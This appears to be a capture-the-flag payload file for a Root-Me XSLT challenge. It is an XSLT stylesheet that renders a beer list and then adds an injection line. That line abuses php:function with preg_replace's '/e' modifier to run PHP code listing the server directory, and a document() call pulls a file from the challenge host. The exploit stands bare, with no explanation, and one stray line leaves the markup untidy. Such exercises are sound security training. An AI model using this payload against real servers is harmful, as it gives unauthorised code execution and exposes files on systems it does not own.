<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:for-each select="beers/beer">
  <div style="background-color:teal;color:white;padding:4px">
    <span style="font-weight:bold"><xsl:value-of select="name"/> - </span>
    <xsl:value-of select="price"/>
    </div>
  <div style="margin-left:20px;margin-bottom:1em;font-size:10pt">
    <p>
    <xsl:value-of select="description"/>
      
    </p>
  </div>
</xsl:for-each>
</body>

<xsl:value-of select="php:function('preg_replace', '/a/e', 'print_r(scandir(getcwd()))', 'hallo')" />
beers.xml
  <xsl:value-of select="document('http://challenge01.root-me.org/web-serveur/ch50/beers.xml')"/>

  
</html>
